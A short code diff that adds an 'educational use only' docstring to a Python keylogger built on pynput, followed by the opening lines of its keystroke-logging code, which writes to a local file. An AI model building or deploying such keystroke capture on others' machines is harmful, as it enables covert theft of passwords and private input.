@@ -1,3 +1,16 @@
+"""
+Python Keylogger (Educational Use Only)
+- This script logs keystrokes to a local file named 'keylog.txt'.
+- It demonstrates low-level keyboard input capturing for learning purposes.
+
+Requirements:
+- pynput library (install via `pip install pynput`)
+
+Usage:
+- Run the script in your terminal/command prompt.
+- Press Ctrl+C to stop logging.
+"""
+
 from pynput import keyboard
 LOG_FILE = "keylog.txt"
 def on_press(key):
